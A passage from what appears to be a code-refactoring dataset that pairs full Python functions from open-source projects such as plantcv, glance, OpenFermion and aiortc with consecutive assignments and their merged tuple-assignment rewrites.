coordgroups = []","unigroup , coordgroups  = np.unique(groups), []"
plantcv,https://github.com/danforthcenter/plantcv/tree/master/plantcv/plantcv/cluster_contours.py,,cluster_contours$9,"def cluster_contours(img, roi_objects, roi_obj_hierarchy, nrow=1, ncol=1, show_grid=False):
    """"""
    This function take a image with multiple contours and clusters them based on user input of rows and columns

    Inputs:
    img                     = RGB or grayscale image data for plotting
    roi_objects             = object contours in an image that are needed to be clustered.
    roi_obj_hierarchy       = object hierarchy
    nrow                    = number of rows to cluster (this should be the approximate  number of desired rows
                              in the entire image (even if there isn't a literal row of plants)
    ncol                    = number of columns to cluster (this should be the approximate number of desired columns
                              in the entire image (even if there isn't a literal row of plants)
    show_grid               = if True then the grid will get plot to show how plants are being clustered

    Returns:
    grouped_contour_indexes = contours grouped
    contours                = All inputed contours

    :param img: numpy.ndarray
    :param roi_objects: list
    :param roi_obj_hierarchy: numpy.ndarray
    :param nrow: int
    :param ncol: int
    :param show_grid: bool
    :return grouped_contour_indexes: list
    :return contours: list
    :return roi_obj_hierarchy: list
    """"""

    if len(np.shape(img)) == 3:
        iy, ix, iz = np.shape(img)
    else:
        iy, ix, = np.shape(img)

    # get the break groups
    if nrow == 1:
        rbreaks = [0, iy]
    else:
        rstep = np.rint(iy / nrow)
        rstep1 = int(rstep)
        rbreaks = range(0, iy, rstep1)
    if ncol == 1:
        cbreaks = [0, ix]
    else:
        cstep = np.rint(ix / ncol)
        cstep1 = int(cstep)
        cbreaks = range(0, ix, cstep1)

    # categorize what bin the center of mass of each contour
    def digitize(a, step):
        # The way cbreaks and rbreaks are calculated, step will never be an integer
        # if isinstance(step, int):
        #     i = step
        # else:
        num_bins = len(step)
        for x in range(0, num_bins):
            if x == 0:
                if a >= 0 and a < step[1]:
                    return 1
            else:
                if a >= step[x - 1] and a < step[x]:
                    return x
                elif a >= np.max(step):
                    return num_bins

    dtype = [('cx', int), ('cy', int), ('rowbin', int), ('colbin', int), ('index', int)]
    coord = []
    for i in range(0, len(roi_objects)):
        m = cv2.moments(roi_objects[i])
        if m['m00'] == 0:
            pass
        else:
            cx = int(m['m10'] / m['m00'])
            cy = int(m['m01'] / m['m00'])
            colbin = digitize(cx, cbreaks)
            rowbin = digitize(cy, rbreaks)
            a = (cx, cy, colbin, rowbin, i)
            coord.append(a)
    coord1 = np.array(coord, dtype=dtype)
    coord2 = np.sort(coord1, order=('colbin', 'rowbin'))

    # get the list of unique coordinates and group the contours with the same bin coordinates
    groups = []
    for i, y in enumerate(coord2):
        col = y[3]
        row = y[2]
        location = str(row) + ',' + str(col)
        groups.append(location)

    unigroup = np.unique(groups)
    coordgroups = []

    for i, y in enumerate(unigroup):
        col_row = y.split(',')
        col = int(col_row[0])
        row = int(col_row[1])
        for a, b in enumerate(coord2):
            if b[2] == col and b[3] == row:
                grp = i
                contour = b[4]
                coordgroups.append((grp, contour))
            else:
                pass

    coordlist = [[y[1] for y in coordgroups if y[0] == x] for x in range(0, (len(unigroup)))]

    contours = roi_objects
    grouped_contour_indexes = coordlist

    # Debug image is rainbow printed contours

    if params.debug is not None:
        if len(np.shape(img)) == 3:
            img_copy = np.copy(img)
        else:
            iy, ix = np.shape(img)
            img_copy = np.zeros((iy, ix, 3), dtype=np.uint8)

        rand_color = color_palette(len(coordlist))
        for i, x in enumerate(coordlist):
            for a in x:
                if roi_obj_hierarchy[0][a][3] > -1:
                    pass
                else:
                    cv2.drawContours(img_copy, roi_objects, a, rand_color[i], -1, hierarchy=roi_obj_hierarchy)
        if show_grid:
            for y in rbreaks:
                cv2.line(img_copy, (0, y), (ix, y), (255, 0, 0), params.line_thickness)
            for x in cbreaks:
                cv2.line(img_copy, (x, 0), (x, iy), (255, 0, 0), params.line_thickness)
    else:
        img_copy = img  # for _debug

    _debug(visual=img_copy,  # keep this outside if statement to avoid additional test
           filename=os.path.join(params.debug_outdir, str(params.device) + '_clusters.png'))

    return grouped_contour_indexes, contours, roi_obj_hierarchy","contours = roi_objects
grouped_contour_indexes = coordlist","contours , grouped_contour_indexes  = roi_objects, coordlist"
plantcv,https://github.com/danforthcenter/plantcv/tree/master/plantcv/plantcv/cluster_contours.py,,cluster_contours$9,"def cluster_contours(img, roi_objects, roi_obj_hierarchy, nrow=1, ncol=1, show_grid=False):
    """"""
    This function take a image with multiple contours and clusters them based on user input of rows and columns

    Inputs:
    img                     = RGB or grayscale image data for plotting
    roi_objects             = object contours in an image that are needed to be clustered.
    roi_obj_hierarchy       = object hierarchy
    nrow                    = number of rows to cluster (this should be the approximate  number of desired rows
                              in the entire image (even if there isn't a literal row of plants)
    ncol                    = number of columns to cluster (this should be the approximate number of desired columns
                              in the entire image (even if there isn't a literal row of plants)
    show_grid               = if True then the grid will get plot to show how plants are being clustered

    Returns:
    grouped_contour_indexes = contours grouped
    contours                = All inputed contours

    :param img: numpy.ndarray
    :param roi_objects: list
    :param roi_obj_hierarchy: numpy.ndarray
    :param nrow: int
    :param ncol: int
    :param show_grid: bool
    :return grouped_contour_indexes: list
    :return contours: list
    :return roi_obj_hierarchy: list
    """"""

    if len(np.shape(img)) == 3:
        iy, ix, iz = np.shape(img)
    else:
        iy, ix, = np.shape(img)

    # get the break groups
    if nrow == 1:
        rbreaks = [0, iy]
    else:
        rstep = np.rint(iy / nrow)
        rstep1 = int(rstep)
        rbreaks = range(0, iy, rstep1)
    if ncol == 1:
        cbreaks = [0, ix]
    else:
        cstep = np.rint(ix / ncol)
        cstep1 = int(cstep)
        cbreaks = range(0, ix, cstep1)

    # categorize what bin the center of mass of each contour
    def digitize(a, step):
        # The way cbreaks and rbreaks are calculated, step will never be an integer
        # if isinstance(step, int):
        #     i = step
        # else:
        num_bins = len(step)
        for x in range(0, num_bins):
            if x == 0:
                if a >= 0 and a < step[1]:
                    return 1
            else:
                if a >= step[x - 1] and a < step[x]:
                    return x
                elif a >= np.max(step):
                    return num_bins

    dtype = [('cx', int), ('cy', int), ('rowbin', int), ('colbin', int), ('index', int)]
    coord = []
    for i in range(0, len(roi_objects)):
        m = cv2.moments(roi_objects[i])
        if m['m00'] == 0:
            pass
        else:
            cx = int(m['m10'] / m['m00'])
            cy = int(m['m01'] / m['m00'])
            colbin = digitize(cx, cbreaks)
            rowbin = digitize(cy, rbreaks)
            a = (cx, cy, colbin, rowbin, i)
            coord.append(a)
    coord1 = np.array(coord, dtype=dtype)
    coord2 = np.sort(coord1, order=('colbin', 'rowbin'))

    # get the list of unique coordinates and group the contours with the same bin coordinates
    groups = []
    for i, y in enumerate(coord2):
        col = y[3]
        row = y[2]
        location = str(row) + ',' + str(col)
        groups.append(location)

    unigroup = np.unique(groups)
    coordgroups = []

    for i, y in enumerate(unigroup):
        col_row = y.split(',')
        col = int(col_row[0])
        row = int(col_row[1])
        for a, b in enumerate(coord2):
            if b[2] == col and b[3] == row:
                grp = i
                contour = b[4]
                coordgroups.append((grp, contour))
            else:
                pass

    coordlist = [[y[1] for y in coordgroups if y[0] == x] for x in range(0, (len(unigroup)))]

    contours = roi_objects
    grouped_contour_indexes = coordlist

    # Debug image is rainbow printed contours

    if params.debug is not None:
        if len(np.shape(img)) == 3:
            img_copy = np.copy(img)
        else:
            iy, ix = np.shape(img)
            img_copy = np.zeros((iy, ix, 3), dtype=np.uint8)

        rand_color = color_palette(len(coordlist))
        for i, x in enumerate(coordlist):
            for a in x:
                if roi_obj_hierarchy[0][a][3] > -1:
                    pass
                else:
                    cv2.drawContours(img_copy, roi_objects, a, rand_color[i], -1, hierarchy=roi_obj_hierarchy)
        if show_grid:
            for y in rbreaks:
                cv2.line(img_copy, (0, y), (ix, y), (255, 0, 0), params.line_thickness)
            for x in cbreaks:
                cv2.line(img_copy, (x, 0), (x, iy), (255, 0, 0), params.line_thickness)
    else:
        img_copy = img  # for _debug

    _debug(visual=img_copy,  # keep this outside if statement to avoid additional test
           filename=os.path.join(params.debug_outdir, str(params.device) + '_clusters.png'))

    return grouped_contour_indexes, contours, roi_obj_hierarchy","col = y[3]
row = y[2]","col , row  = y[3], y[2]"
plantcv,https://github.com/danforthcenter/plantcv/tree/master/plantcv/plantcv/cluster_contours.py,,cluster_contours$9,"def cluster_contours(img, roi_objects, roi_obj_hierarchy, nrow=1, ncol=1, show_grid=False):
    """"""
    This function take a image with multiple contours and clusters them based on user input of rows and columns

    Inputs:
    img                     = RGB or grayscale image data for plotting
    roi_objects             = object contours in an image that are needed to be clustered.
    roi_obj_hierarchy       = object hierarchy
    nrow                    = number of rows to cluster (this should be the approximate  number of desired rows
                              in the entire image (even if there isn't a literal row of plants)
    ncol                    = number of columns to cluster (this should be the approximate number of desired columns
                              in the entire image (even if there isn't a literal row of plants)
    show_grid               = if True then the grid will get plot to show how plants are being clustered

    Returns:
    grouped_contour_indexes = contours grouped
    contours                = All inputed contours

    :param img: numpy.ndarray
    :param roi_objects: list
    :param roi_obj_hierarchy: numpy.ndarray
    :param nrow: int
    :param ncol: int
    :param show_grid: bool
    :return grouped_contour_indexes: list
    :return contours: list
    :return roi_obj_hierarchy: list
    """"""

    if len(np.shape(img)) == 3:
        iy, ix, iz = np.shape(img)
    else:
        iy, ix, = np.shape(img)

    # get the break groups
    if nrow == 1:
        rbreaks = [0, iy]
    else:
        rstep = np.rint(iy / nrow)
        rstep1 = int(rstep)
        rbreaks = range(0, iy, rstep1)
    if ncol == 1:
        cbreaks = [0, ix]
    else:
        cstep = np.rint(ix / ncol)
        cstep1 = int(cstep)
        cbreaks = range(0, ix, cstep1)

    # categorize what bin the center of mass of each contour
    def digitize(a, step):
        # The way cbreaks and rbreaks are calculated, step will never be an integer
        # if isinstance(step, int):
        #     i = step
        # else:
        num_bins = len(step)
        for x in range(0, num_bins):
            if x == 0:
                if a >= 0 and a < step[1]:
                    return 1
            else:
                if a >= step[x - 1] and a < step[x]:
                    return x
                elif a >= np.max(step):
                    return num_bins

    dtype = [('cx', int), ('cy', int), ('rowbin', int), ('colbin', int), ('index', int)]
    coord = []
    for i in range(0, len(roi_objects)):
        m = cv2.moments(roi_objects[i])
        if m['m00'] == 0:
            pass
        else:
            cx = int(m['m10'] / m['m00'])
            cy = int(m['m01'] / m['m00'])
            colbin = digitize(cx, cbreaks)
            rowbin = digitize(cy, rbreaks)
            a = (cx, cy, colbin, rowbin, i)
            coord.append(a)
    coord1 = np.array(coord, dtype=dtype)
    coord2 = np.sort(coord1, order=('colbin', 'rowbin'))

    # get the list of unique coordinates and group the contours with the same bin coordinates
    groups = []
    for i, y in enumerate(coord2):
        col = y[3]
        row = y[2]
        location = str(row) + ',' + str(col)
        groups.append(location)

    unigroup = np.unique(groups)
    coordgroups = []

    for i, y in enumerate(unigroup):
        col_row = y.split(',')
        col = int(col_row[0])
        row = int(col_row[1])
        for a, b in enumerate(coord2):
            if b[2] == col and b[3] == row:
                grp = i
                contour = b[4]
                coordgroups.append((grp, contour))
            else:
                pass

    coordlist = [[y[1] for y in coordgroups if y[0] == x] for x in range(0, (len(unigroup)))]

    contours = roi_objects
    grouped_contour_indexes = coordlist

    # Debug image is rainbow printed contours

    if params.debug is not None:
        if len(np.shape(img)) == 3:
            img_copy = np.copy(img)
        else:
            iy, ix = np.shape(img)
            img_copy = np.zeros((iy, ix, 3), dtype=np.uint8)

        rand_color = color_palette(len(coordlist))
        for i, x in enumerate(coordlist):
            for a in x:
                if roi_obj_hierarchy[0][a][3] > -1:
                    pass
                else:
                    cv2.drawContours(img_copy, roi_objects, a, rand_color[i], -1, hierarchy=roi_obj_hierarchy)
        if show_grid:
            for y in rbreaks:
                cv2.line(img_copy, (0, y), (ix, y), (255, 0, 0), params.line_thickness)
            for x in cbreaks:
                cv2.line(img_copy, (x, 0), (x, iy), (255, 0, 0), params.line_thickness)
    else:
        img_copy = img  # for _debug

    _debug(visual=img_copy,  # keep this outside if statement to avoid additional test
           filename=os.path.join(params.debug_outdir, str(params.device) + '_clusters.png'))

    return grouped_contour_indexes, contours, roi_obj_hierarchy","col = int(col_row[0])
row = int(col_row[1])","col , row  = int(col_row[0]), int(col_row[1])"
plantcv,https://github.com/danforthcenter/plantcv/tree/master/plantcv/plantcv/cluster_contours.py,,cluster_contours$9,"def cluster_contours(img, roi_objects, roi_obj_hierarchy, nrow=1, ncol=1, show_grid=False):
    """"""
    This function take a image with multiple contours and clusters them based on user input of rows and columns

    Inputs:
    img                     = RGB or grayscale image data for plotting
    roi_objects             = object contours in an image that are needed to be clustered.
    roi_obj_hierarchy       = object hierarchy
    nrow                    = number of rows to cluster (this should be the approximate  number of desired rows
                              in the entire image (even if there isn't a literal row of plants)
    ncol                    = number of columns to cluster (this should be the approximate number of desired columns
                              in the entire image (even if there isn't a literal row of plants)
    show_grid               = if True then the grid will get plot to show how plants are being clustered

    Returns:
    grouped_contour_indexes = contours grouped
    contours                = All inputed contours

    :param img: numpy.ndarray
    :param roi_objects: list
    :param roi_obj_hierarchy: numpy.ndarray
    :param nrow: int
    :param ncol: int
    :param show_grid: bool
    :return grouped_contour_indexes: list
    :return contours: list
    :return roi_obj_hierarchy: list
    """"""

    if len(np.shape(img)) == 3:
        iy, ix, iz = np.shape(img)
    else:
        iy, ix, = np.shape(img)

    # get the break groups
    if nrow == 1:
        rbreaks = [0, iy]
    else:
        rstep = np.rint(iy / nrow)
        rstep1 = int(rstep)
        rbreaks = range(0, iy, rstep1)
    if ncol == 1:
        cbreaks = [0, ix]
    else:
        cstep = np.rint(ix / ncol)
        cstep1 = int(cstep)
        cbreaks = range(0, ix, cstep1)

    # categorize what bin the center of mass of each contour
    def digitize(a, step):
        # The way cbreaks and rbreaks are calculated, step will never be an integer
        # if isinstance(step, int):
        #     i = step
        # else:
        num_bins = len(step)
        for x in range(0, num_bins):
            if x == 0:
                if a >= 0 and a < step[1]:
                    return 1
            else:
                if a >= step[x - 1] and a < step[x]:
                    return x
                elif a >= np.max(step):
                    return num_bins

    dtype = [('cx', int), ('cy', int), ('rowbin', int), ('colbin', int), ('index', int)]
    coord = []
    for i in range(0, len(roi_objects)):
        m = cv2.moments(roi_objects[i])
        if m['m00'] == 0:
            pass
        else:
            cx = int(m['m10'] / m['m00'])
            cy = int(m['m01'] / m['m00'])
            colbin = digitize(cx, cbreaks)
            rowbin = digitize(cy, rbreaks)
            a = (cx, cy, colbin, rowbin, i)
            coord.append(a)
    coord1 = np.array(coord, dtype=dtype)
    coord2 = np.sort(coord1, order=('colbin', 'rowbin'))

    # get the list of unique coordinates and group the contours with the same bin coordinates
    groups = []
    for i, y in enumerate(coord2):
        col = y[3]
        row = y[2]
        location = str(row) + ',' + str(col)
        groups.append(location)

    unigroup = np.unique(groups)
    coordgroups = []

    for i, y in enumerate(unigroup):
        col_row = y.split(',')
        col = int(col_row[0])
        row = int(col_row[1])
        for a, b in enumerate(coord2):
            if b[2] == col and b[3] == row:
                grp = i
                contour = b[4]
                coordgroups.append((grp, contour))
            else:
                pass

    coordlist = [[y[1] for y in coordgroups if y[0] == x] for x in range(0, (len(unigroup)))]

    contours = roi_objects
    grouped_contour_indexes = coordlist

    # Debug image is rainbow printed contours

    if params.debug is not None:
        if len(np.shape(img)) == 3:
            img_copy = np.copy(img)
        else:
            iy, ix = np.shape(img)
            img_copy = np.zeros((iy, ix, 3), dtype=np.uint8)

        rand_color = color_palette(len(coordlist))
        for i, x in enumerate(coordlist):
            for a in x:
                if roi_obj_hierarchy[0][a][3] > -1:
                    pass
                else:
                    cv2.drawContours(img_copy, roi_objects, a, rand_color[i], -1, hierarchy=roi_obj_hierarchy)
        if show_grid:
            for y in rbreaks:
                cv2.line(img_copy, (0, y), (ix, y), (255, 0, 0), params.line_thickness)
            for x in cbreaks:
                cv2.line(img_copy, (x, 0), (x, iy), (255, 0, 0), params.line_thickness)
    else:
        img_copy = img  # for _debug

    _debug(visual=img_copy,  # keep this outside if statement to avoid additional test
           filename=os.path.join(params.debug_outdir, str(params.device) + '_clusters.png'))

    return grouped_contour_indexes, contours, roi_obj_hierarchy","grp = i
contour = b[4]","grp , contour  = i, b[4]"
glance,https://github.com/openstack/glance/tree/master/glance/tests/unit/v2/test_images_resource.py,TestImagesSerializerWithUnicode,test_show_full_fixture$5421,"def test_show_full_fixture(self):
        expected = {
            u'id': UUID1,
            u'name': u'OpenStack\u2122-1',
            u'status': u'queued',
            u'visibility': u'public',
            u'protected': False,
            u'os_hidden': False,
            u'tags': set([u'\u2160', u'\u2161']),
            u'size': 1024,
            u'virtual_size': 3072,
            u'checksum': u'ca425b88f047ce8ec45ee90e813ada91',
            u'os_hash_algo': six.text_type(FAKEHASHALGO),
            u'os_hash_value': six.text_type(MULTIHASH1),
            u'container_format': u'ami',
            u'disk_format': u'ami',
            u'min_ram': 128,
            u'min_disk': 10,
            u'created_at': six.text_type(ISOTIME),
            u'updated_at': six.text_type(ISOTIME),
            u'self': u'/v2/images/%s' % UUID1,
            u'file': u'/v2/images/%s/file' % UUID1,
            u'schema': u'/v2/schemas/image',
            u'lang': u'Fran\u00E7ais',
            u'dispos\u00E9': u'f\u00E2ch\u00E9',
            u'owner': u'6838eb7b-6ded-434a-882c-b344c77fe8df',
        }
        response = webob.Response()
        self.serializer.show(response, self.fixtures[0])
        actual = jsonutils.loads(response.body)
        actual['tags'] = set(actual['tags'])
        self.assertEqual(expected, actual)
        self.assertEqual('application/json', response.content_type)","expected = {u'id': UUID1, u'name': u'OpenStack™-1', u'status': u'queued', u'visibility': u'public', u'protected': False, u'os_hidden': False, u'tags': set([u'Ⅰ', u'Ⅱ']), u'size': 1024, u'virtual_size': 3072, u'checksum': u'ca425b88f047ce8ec45ee90e813ada91', u'os_hash_algo': six.text_type(FAKEHASHALGO), u'os_hash_value': six.text_type(MULTIHASH1), u'container_format': u'ami', u'disk_format': u'ami', u'min_ram': 128, u'min_disk': 10, u'created_at': six.text_type(ISOTIME), u'updated_at': six.text_type(ISOTIME), u'self': u'/v2/images/%s' % UUID1, u'file': u'/v2/images/%s/file' % UUID1, u'schema': u'/v2/schemas/image', u'lang': u'Français', u'disposé': u'fâché', u'owner': u'6838eb7b-6ded-434a-882c-b344c77fe8df'}
response = webob.Response()","expected , response  = {u'id': UUID1, u'name': u'OpenStack™-1', u'status': u'queued', u'visibility': u'public', u'protected': False, u'os_hidden': False, u'tags': set([u'Ⅰ', u'Ⅱ']), u'size': 1024, u'virtual_size': 3072, u'checksum': u'ca425b88f047ce8ec45ee90e813ada91', u'os_hash_algo': six.text_type(FAKEHASHALGO), u'os_hash_value': six.text_type(MULTIHASH1), u'container_format': u'ami', u'disk_format': u'ami', u'min_ram': 128, u'min_disk': 10, u'created_at': six.text_type(ISOTIME), u'updated_at': six.text_type(ISOTIME), u'self': u'/v2/images/%s' % UUID1, u'file': u'/v2/images/%s/file' % UUID1, u'schema': u'/v2/schemas/image', u'lang': u'Français', u'disposé': u'fâché', u'owner': u'6838eb7b-6ded-434a-882c-b344c77fe8df'}, webob.Response()"
Paddle,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/fluid/tests/unittests/xpu/test_one_hot_op_xpu.py,XPUTestOneHotOP,__init__$35,"def __init__(self):
        self.op_name = 'one_hot'
        self.use_dynamic_create_class = False","self.op_name = 'one_hot'
self.use_dynamic_create_class = False","self.op_name , self.use_dynamic_create_class  = 'one_hot', False"
videos,https://github.com/3b1b/videos/tree/master/_2017/eoc/chapter1.py,ApproximateOneRing,isolate_one_ring$800,"def isolate_one_ring(self):
        rings = self.rings
        index = int(self.ring_index_proportion*len(rings))
        original_ring = rings[index]
        ring = original_ring.copy()

        radius = Line(ORIGIN, ring.R*RIGHT, color = WHITE)
        radius.rotate(np.pi/4)
        r_label = Tex(""r"")
        r_label.next_to(radius.get_center(), UP+LEFT, SMALL_BUFF)
        area_q = TexText(""Area"", ""?"", arg_separator = """")
        area_q.set_color(YELLOW)


        self.play(
            ring.shift, self.ring_shift_val,
            original_ring.set_fill, None, 0.25,
            Animation(self.radius_group),
        )

        VGroup(radius, r_label).shift(ring.get_center())
        area_q.next_to(ring, RIGHT)

        self.play(ShowCreation(radius))
        self.play(Write(r_label))
        self.wait()
        self.play(Write(area_q))
        self.wait()
        self.play(*[
            ApplyMethod(
                r.set_fill, YELLOW, 
                rate_func = squish_rate_func(there_and_back, alpha, alpha+0.15),
                run_time = 3
            )
            for r, alpha in zip(rings, np.linspace(0, 0.85, len(rings)))
        ]+[
            Animation(self.radius_group)
        ])
        self.wait()
        self.change_mode(""thinking"")
        self.wait()

        self.original_ring = original_ring
        self.ring = ring
        self.ring_radius_group = VGroup(radius, r_label)
        self.area_q = area_q","self.original_ring = original_ring
self.ring = ring
self.ring_radius_group = VGroup(radius, r_label)
self.area_q = area_q","self.original_ring , self.ring , self.ring_radius_group , self.area_q  = original_ring, ring, VGroup(radius, r_label), area_q"
pennylane,https://github.com/PennyLaneAI/pennylane/tree/master/tests/drawer/test_mpldrawer.py,TestCTRL,test_ctrl_formatting$361,"def test_ctrl_formatting(self):
        """"""Tests two control wires with no target.""""""

        drawer = MPLDrawer(1, 3)

        ctrl_wires = (0, 1)
        rgba_red = (1, 0, 0, 1)
        options = {""color"": rgba_red, ""linewidth"": 4}
        drawer.ctrl(0, ctrl_wires, control_values=[1, 0], options=options)

        ctrl_line = drawer.ax.lines[3]
        assert ctrl_line.get_color() == rgba_red
        assert ctrl_line.get_linewidth() == 4

        closed_circ = drawer.ax.patches[0]
        assert closed_circ.get_facecolor() == rgba_red

        open_circ = drawer.ax.patches[1]
        assert open_circ.get_edgecolor() == rgba_red
        assert open_circ.get_facecolor() == to_rgba(plt.rcParams[""axes.facecolor""])
        assert open_circ.get_linewidth() == 4

        plt.close()","drawer = MPLDrawer(1, 3)
ctrl_wires = (0, 1)
rgba_red = (1, 0, 0, 1)","drawer , ctrl_wires , rgba_red  = MPLDrawer(1, 3), (0, 1), (1, 0, 0, 1)"
indico,https://github.com/indico/indico/tree/master/indico/web/util_test.py,,test_get_oauth_user_no_token$130,"def test_get_oauth_user_no_token(mocker, headers):
    request = mocker.patch('indico.web.util.request')
    request.headers = headers
    acquire_token = mocker.patch.object(IndicoResourceProtector, 'acquire_token')
    assert get_oauth_user('whatever') is None
    acquire_token.assert_not_called()","request.headers = headers
acquire_token = mocker.patch.object(IndicoResourceProtector, 'acquire_token')","request.headers , acquire_token  = headers, mocker.patch.object(IndicoResourceProtector, 'acquire_token')"
Gradient-Free-Optimizers,https://github.com/SimonBlanke/Gradient-Free-Optimizers/tree/master/gradient_free_optimizers/optimizers/global_opt/powells_method.py,PowellsMethod,finish_initialization$29,"def finish_initialization(self):
        self.nth_iter_ = -1
        self.nth_iter_current_dim = 0","self.nth_iter_ = -1
self.nth_iter_current_dim = 0","self.nth_iter_ , self.nth_iter_current_dim  = -1, 0"
OpenFermion,https://github.com/quantumlib/OpenFermion/tree/master/src/openfermion/hamiltonians/general_hubbard.py,FermiHubbardModel,__init__$163,"def __init__(self,
                 lattice,
                 tunneling_parameters=None,
                 interaction_parameters=None,
                 potential_parameters=None,
                 magnetic_field=0.,
                 particle_hole_symmetry=False):
        r""""""A Hubbard model defined on a lattice.

        Args:
            lattice (HubbardLattice): The lattice on which the model is defined.
            tunneling_parameters (Iterable[Tuple[Hashable, Tuple[int, int],
                float]], optional): The tunneling parameters.
            interaction_parameters (Iterable[Tuple[Hashable, Tuple[int, int],
                float, int?]], optional): The interaction parameters.
            potential_parameters (Iterable[Tuple[int, float]], optional): The
                potential parameters.
            magnetic_field (float, optional): The magnetic field. Default is 0.
            particle_hole_symmetry: If true, each number operator $n$ is
                replaced with $n - 1/2$.

        Each group of parameters is specified as an iterable of tuples.

        Each tunneling parameter is a tuple ``(edge_type, dofs, coefficient)``.

        In the spinful, model, the tunneling parameter corresponds to the terms

        $$
            t \sum_{(i, j) \in E^{(\mathrm{edge type})}}
            \sum_{\sigma}
            \left(a_{i, a, \sigma}^{\dagger} a_{j, b, \sigma}
            + a_{j, b, \sigma}^{\dagger} a_{i, a, \sigma}\right)
        $$

        and in the spinless model to

        $$
            -t \sum_{(i, j) \in E^{(\mathrm{edge type})}}
            \left(a_{i, a}^{\dagger} a_{j, b}
            + a_{j, b}^{\dagger} a_{i, a}\right),
        $$

        where

            - $(a, b)$ is the pair of degrees
            of freedom given by ``dofs``;
            - $E^{(\mathrm{edge type})}$ is the set of ordered pairs of
              site indices returned by ``lattice.site_pairs_iter(edge_type, a !=
              b)``; and
            - $t$ is the ``coefficient``.

        Each interaction parameter is a tuple ``(edge_type, dofs,
        coefficient, spin_pairs)``. The final ``spin_pairs`` element is
        optional, and will default to ``SpinPairs.ALL``. In any case, it is
        ignored for spinless lattices.

        For example, in the spinful model if `dofs`
        indicates distinct degrees of freedom then the
        parameter corresponds to the terms

        $$
        U \sum_{(i, j) \in E^{(\mathrm{edge type})}} \sum_{(\sigma, \sigma')}
        n_{i, a, \sigma} n_{j, b, \sigma'}
        $$

        where

            - $(a, b)$ is the pair of degrees of
            freedom given by ``dofs``;
            - $E^{(\mathrm{edge type})}$ is the set of ordered pairs of
              site indices returned by ``lattice.site_pairs_iter(edge_type)``;
            - $U$ is the ``coefficient``; and
            - $(\sigma, \sigma')$ runs over
                - all four possible pairs of spins
                if `spin_pairs == SpinPairs.ALL`,
                - $\{(\uparrow, \downarrow), (\downarrow, \uparrow)\}$
                if `spin_pairs == SpinPairs.DIFF`, and
                - $\{(\uparrow, \uparrow), (\downarrow, \downarrow)\}$
                if 'spin_pairs == SpinPairs.SAME`.

        Each potential parameter is a tuple ``(dof, coefficient)``.
        For example, in the spinful model, it corresponds to the terms

        $$
            -\mu \sum_{i} \sum_{\sigma} n_{i, a, \sigma},
        $$

        where

            - $i$ runs over the sites of the lattice;
            - $a$ is the degree of freedom ``dof``; and
            - $\mu$ is the ``coefficient``.

        In the spinless model, the magnetic field is ignored.
        """"""

        self.lattice = lattice

        self.tunneling_parameters = self.parse_tunneling_parameters(
            tunneling_parameters)
        self.interaction_parameters = self.parse_interaction_parameters(
            interaction_parameters)
        self.potential_parameters = self.parse_potential_parameters(
            potential_parameters)
        self.magnetic_field = magnetic_field
        self.particle_hole_symmetry = particle_hole_symmetry","self.potential_parameters = self.parse_potential_parameters(potential_parameters)
self.magnetic_field = magnetic_field
self.particle_hole_symmetry = particle_hole_symmetry","self.potential_parameters , self.magnetic_field , self.particle_hole_symmetry  = self.parse_potential_parameters(potential_parameters), magnetic_field, particle_hole_symmetry"
findatapy,https://github.com/cuemacro/findatapy/tree/master/findatapy/market/marketdatarequest.py,MarketDataRequest,gran_freq$390,"def gran_freq(self, gran_freq):
        try:
            gran_freq = gran_freq.lower()

            valid_gran_freq = ['tick', 'second', 'minute', 'hourly', 'pseudodaily', 'daily', 'weekly', 'monthly',
                               'quarterly', 'annually']

            if not gran_freq in valid_gran_freq:
                LoggerManager().getLogger(__name__).warning(gran_freq & "" is not a defined frequency"")

            if gran_freq in ['minute', 'hourly']:
                self.__freq = 'intraday'
            elif gran_freq in ['tick', 'second']:
                self.__freq = 'tick'
            else:
                self.__freq = 'daily'
        except:
            pass

        self.__gran_freq = gran_freq","gran_freq = gran_freq.lower()
valid_gran_freq = ['tick', 'second', 'minute', 'hourly', 'pseudodaily', 'daily', 'weekly', 'monthly', 'quarterly', 'annually']","gran_freq , valid_gran_freq  = gran_freq.lower(), ['tick', 'second', 'minute', 'hourly', 'pseudodaily', 'daily', 'weekly', 'monthly', 'quarterly', 'annually']"
aiortc,https://github.com/aiortc/aiortc/tree/master/tests/test_rtcsctptransport.py,RTCSctpTransportTest,test_send_data_with_gap_3_retransmit$2204,"def test_send_data_with_gap_3_retransmit(self):
        sent_tsns = []

        async def mock_send_chunk(chunk):
            sent_tsns.append(chunk.tsn)

        client = RTCSctpTransport(self.client_transport)
        client._last_sacked_tsn = 4294967295
        client._local_tsn = 0
        client._ssthresh = 131072
        client._send_chunk = mock_send_chunk

        # queue 8 chunks, but cwnd only allows 3
        with self.assertTimerRestarted(client):
            run(client._send(123, 456, b""M"" * USERDATA_MAX_LENGTH * 8))

        self.assertEqual(client._cwnd, 3600)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 3600)
        self.assertEqual(sent_tsns, [0, 1, 2])
        self.assertEqual(outstanding_tsns(client), [0, 1, 2])
        self.assertEqual(queued_tsns(client), [3, 4, 5, 6, 7])

        # SACK comes in acknowledging chunks 0 and 1
        sack = SackChunk()
        sack.cumulative_tsn = 1
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5])
        self.assertEqual(queued_tsns(client), [6, 7])

        # SACK comes in acknowledging chunk 5
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 4)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerPreserved(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6])
        self.assertEqual(queued_tsns(client), [7])

        # SACK comes in acknowledging chunk 6
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 5)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerPreserved(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7])
